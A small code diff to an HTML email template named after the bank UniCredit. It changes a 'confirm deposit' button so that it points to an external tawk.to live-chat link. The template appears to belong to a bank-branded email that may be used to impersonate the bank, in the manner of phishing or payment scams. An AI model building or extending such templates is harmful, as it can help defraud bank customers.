@@ -225,7 +225,7 @@ export const getUnicreditEmailTemplate = (data: any, lang?: string) => `<!DOCTYP
             </div>
 
             <div class="btn-container">
-                <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.recipient_email || '')}&source=unicredit" class="btn">${t('confirm_deposit', lang)}</a>
+                <a href="https://tawk.to/chat/6a36a52cb40d591d46abb3d0/1jrinadmk" class="btn">${t('confirm_deposit', lang)}</a>
             </div>
 
             <div class="security-section">
